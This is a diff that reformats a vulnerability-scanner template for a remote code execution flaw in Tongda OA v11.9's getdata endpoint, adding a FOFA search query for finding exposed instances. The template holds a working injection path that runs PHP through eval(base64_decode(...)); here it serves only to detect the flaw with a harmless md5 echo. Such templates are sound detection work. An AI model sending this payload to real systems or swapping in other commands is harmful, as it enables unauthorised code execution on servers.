@@ -1,5 +1,4 @@
 id: tongda-getdata-rce
-
 info:
   name: Tongda OA v11.9 getadata - Remote Code Execution
   author: SleepingBag945
@@ -11,29 +10,26 @@ info:
   classification:
     cpe: cpe:2.3:a:tongda2000:office_anywhere:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: app="TDXK-通达OA"
     max-request: 1
+    product: office_anywhere
     vendor: tongda2000
-  tags: tongda,rce,vuln
-
+    verified: true
+  tags: rce,tongda,vuln
 variables:
-  num: '999999999'
-  payload: "echo md5({{num}});"
-
+  num: "999999999"
+  payload: echo md5({{num}});
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
+        type: word
         words:
           - '{{md5(num)}}'
-          - 'pagelimit'
-        condition: and
-
-      - type: status
-        status:
+          - pagelimit
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage'
